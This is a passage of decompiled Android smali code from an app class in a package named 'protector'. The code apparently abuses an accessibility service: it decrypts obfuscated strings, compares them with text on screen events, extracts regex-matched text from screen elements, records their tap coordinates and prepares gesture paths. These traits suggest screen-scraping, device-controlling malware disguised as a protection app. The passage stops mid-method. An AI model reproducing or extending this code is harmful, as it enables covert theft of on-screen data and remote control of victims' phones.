.class public abstract Lcom/icontrol/protector/c;
.super Ljava/lang/Object;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/icontrol/protector/c$f;
    }
.end annotation


# static fields
.field static a:Lcom/icontrol/protector/AccessServices; = null

.field static b:Z = false

.field public static c:Ljava/util/LinkedList;

.field public static d:Ljava/util/Set;

.field public static e:Ljava/util/LinkedList;

.field static f:Z

.field static g:Ljava/util/Locale;

.field static h:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    sput-object v0, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    new-instance v0, Ljava/util/HashSet;

    invoke-direct {v0}, Ljava/util/HashSet;-><init>()V

    sput-object v0, Lcom/icontrol/protector/c;->d:Ljava/util/Set;

    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    sput-object v0, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    const/4 v0, 0x0

    sput-boolean v0, Lcom/icontrol/protector/c;->f:Z

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/c;->g:Ljava/util/Locale;

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    new-instance v2, Lcom/icontrol/protector/c$c;

    invoke-direct {v2}, Lcom/icontrol/protector/c$c;-><init>()V

    invoke-direct {v0, v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;Landroid/os/Handler$Callback;)V

    sput-object v0, Lcom/icontrol/protector/c;->h:Landroid/os/Handler;

    return-void
.end method

.method static synthetic a(Lcom/icontrol/protector/AccessServices;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/icontrol/protector/c;->m(Lcom/icontrol/protector/AccessServices;)V

    return-void
.end method

.method static synthetic b(Lcom/icontrol/protector/AccessServices;)I
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/icontrol/protector/c;->l(Lcom/icontrol/protector/AccessServices;)I

    move-result p0

    return p0
.end method

.method static synthetic c(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/icontrol/protector/c;->i(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)V

    return-void
.end method

.method static synthetic d(Lcom/icontrol/protector/AccessServices;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/icontrol/protector/c;->h(Lcom/icontrol/protector/AccessServices;)V

    return-void
.end method

.method static synthetic e(Landroid/graphics/Path;ILcom/icontrol/protector/AccessServices;)V
    .locals 0

    .line 1
    invoke-static {p0, p1, p2}, Lcom/icontrol/protector/c;->n(Landroid/graphics/Path;ILcom/icontrol/protector/AccessServices;)V

    return-void
.end method

.method public static f(Landroid/view/accessibility/AccessibilityEvent;Landroid/content/Context;)V
    .locals 17

    .line 1
    sget-boolean v0, Lcom/icontrol/protector/c;->b:Z

    const/16 v1, 0xa

    const/16 v2, 0x17

    const/16 v3, 0x1d

    const/16 v4, 0x23

    const/16 v5, 0x33

    const/16 v6, 0x2a

    const/16 v7, 0x21

    const/16 v8, 0x4000

    const/16 v9, 0x13

    const/16 v10, 0xd

    const/16 v11, 0x11

    const/16 v12, 0x15

    const/16 v13, 0x12

    const/4 v14, 0x0

    const/16 v15, 0x8

    if-eqz v0, :cond_1

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    if-ne v0, v8, :cond_1

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    new-array v0, v13, [B

    fill-array-data v0, :array_0

    new-array v8, v15, [B

    fill-array-data v8, :array_1

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v13, [B

    fill-array-data v0, :array_2

    new-array v8, v15, [B

    fill-array-data v8, :array_3

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v13, [B

    fill-array-data v0, :array_4

    new-array v8, v15, [B

    fill-array-data v8, :array_5

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v12, [B

    fill-array-data v0, :array_6

    new-array v8, v15, [B

    fill-array-data v8, :array_7

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v12, [B

    fill-array-data v0, :array_8

    new-array v8, v15, [B

    fill-array-data v8, :array_9

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v7, [B

    fill-array-data v0, :array_a

    new-array v8, v15, [B

    fill-array-data v8, :array_b

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v6, [B

    fill-array-data v0, :array_c

    new-array v8, v15, [B

    fill-array-data v8, :array_d

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v11, [B

    fill-array-data v0, :array_e

    new-array v8, v15, [B

    fill-array-data v8, :array_f

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v10, [B

    fill-array-data v0, :array_10

    new-array v8, v15, [B

    fill-array-data v8, :array_11

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v9, [B

    fill-array-data v0, :array_12

    new-array v8, v15, [B

    fill-array-data v8, :array_13

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v5, [B

    fill-array-data v0, :array_14

    new-array v8, v15, [B

    fill-array-data v8, :array_15

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v4, [B

    fill-array-data v0, :array_16

    new-array v8, v15, [B

    fill-array-data v8, :array_17

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v12, [B

    fill-array-data v0, :array_18

    new-array v8, v15, [B

    fill-array-data v8, :array_19

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v3, [B

    fill-array-data v0, :array_1a

    new-array v8, v15, [B

    fill-array-data v8, :array_1b

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v13, [B

    fill-array-data v0, :array_1c

    new-array v8, v15, [B

    fill-array-data v8, :array_1d

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v9, [B

    fill-array-data v0, :array_1e

    new-array v8, v15, [B

    fill-array-data v8, :array_1f

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v2, [B

    fill-array-data v0, :array_20

    new-array v8, v15, [B

    fill-array-data v8, :array_21

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v1, [B

    fill-array-data v0, :array_22

    new-array v8, v15, [B

    fill-array-data v8, :array_23

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    new-array v0, v12, [B

    fill-array-data v0, :array_24

    new-array v8, v15, [B

    fill-array-data v8, :array_25

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    const/16 v0, 0x14

    new-array v0, v0, [B

    fill-array-data v0, :array_26

    new-array v8, v15, [B

    fill-array-data v8, :array_27

    invoke-static {v0, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v8

    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    sput-boolean v14, Lcom/icontrol/protector/c;->b:Z

    :cond_1
    sget-boolean v0, Lcom/icontrol/protector/c;->b:Z

    const-string v8, ""

    const/4 v1, 0x3

    if-eqz v0, :cond_6

    sget-boolean v0, Lcom/icontrol/protector/c;->f:Z

    if-nez v0, :cond_6

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_6

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v7

    const/16 v4, 0x9

    if-ne v7, v4, :cond_6

    move v4, v14

    :goto_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v7

    if-ge v4, v7, :cond_6

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-eqz v7, :cond_5

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getActionList()Ljava/util/List;

    move-result-object v2

    if-eqz v2, :cond_5

    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v16

    if-nez v16, :cond_5

    invoke-interface {v2, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo$AccessibilityAction;

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo$AccessibilityAction;->getId()I

    move-result v2

    const/16 v5, 0x40

    if-ne v2, v5, :cond_5

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_1

    :cond_2
    move-object v2, v8

    :goto_1
    sget-object v5, Lcom/icontrol/protector/c;->d:Ljava/util/Set;

    invoke-interface {v5, v2}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_3

    goto :goto_2

    :cond_3
    if-eqz v2, :cond_4

    new-array v5, v1, [B

    fill-array-data v5, :array_28

    new-array v1, v15, [B

    fill-array-data v1, :array_29

    invoke-static {v5, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/regex/Matcher;->find()Z

    move-result v5

    if-eqz v5, :cond_4

    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v1

    new-instance v5, Landroid/graphics/Rect;

    invoke-direct {v5}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v7, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v5}, Landroid/graphics/Rect;->width()I

    move-result v7

    if-lez v7, :cond_5

    invoke-virtual {v5}, Landroid/graphics/Rect;->height()I

    move-result v7

    if-lez v7, :cond_5

    new-instance v7, Lcom/icontrol/protector/c$f;

    invoke-virtual {v5}, Landroid/graphics/Rect;->centerX()I

    move-result v12

    int-to-float v12, v12

    invoke-virtual {v5}, Landroid/graphics/Rect;->centerY()I

    move-result v5

    int-to-float v5, v5

    invoke-direct {v7, v12, v5, v1}, Lcom/icontrol/protector/c$f;-><init>(FFLjava/lang/String;)V

    sget-object v1, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    invoke-virtual {v1, v7}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    sget-object v1, Lcom/icontrol/protector/c;->d:Ljava/util/Set;

    invoke-interface {v1, v2}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    goto :goto_2

    :cond_4
    return-void

    :cond_5
    :goto_2
    add-int/lit8 v4, v4, 0x1

    const/4 v1, 0x3

    const/16 v2, 0x17

    const/16 v5, 0x33

    const/16 v12, 0x15

    goto/16 :goto_0

    :cond_6
    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/4 v1, 0x1

    const/16 v2, 0x4000

    if-ne v0, v2, :cond_b

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_b

    new-array v0, v13, [B

    fill-array-data v0, :array_2a

    new-array v2, v15, [B

    fill-array-data v2, :array_2b

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    new-array v0, v13, [B

    fill-array-data v0, :array_2c

    new-array v2, v15, [B

    fill-array-data v2, :array_2d

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    const/16 v0, 0x1b

    new-array v2, v0, [B

    fill-array-data v2, :array_2e

    new-array v4, v15, [B

    fill-array-data v4, :array_2f

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_9

    new-array v2, v13, [B

    fill-array-data v2, :array_30

    new-array v4, v15, [B

    fill-array-data v4, :array_31

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_9

    const/16 v2, 0x18

    new-array v4, v2, [B

    fill-array-data v4, :array_32

    new-array v5, v15, [B

    fill-array-data v5, :array_33

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_9

    new-array v4, v0, [B

    fill-array-data v4, :array_34

    new-array v5, v15, [B

    fill-array-data v5, :array_35

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_9

    new-array v4, v0, [B

    fill-array-data v4, :array_36

    new-array v5, v15, [B

    fill-array-data v5, :array_37

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_9

    const/16 v4, 0x24

    new-array v5, v4, [B

    fill-array-data v5, :array_38

    new-array v7, v15, [B

    fill-array-data v7, :array_39

    invoke-static {v5, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v7

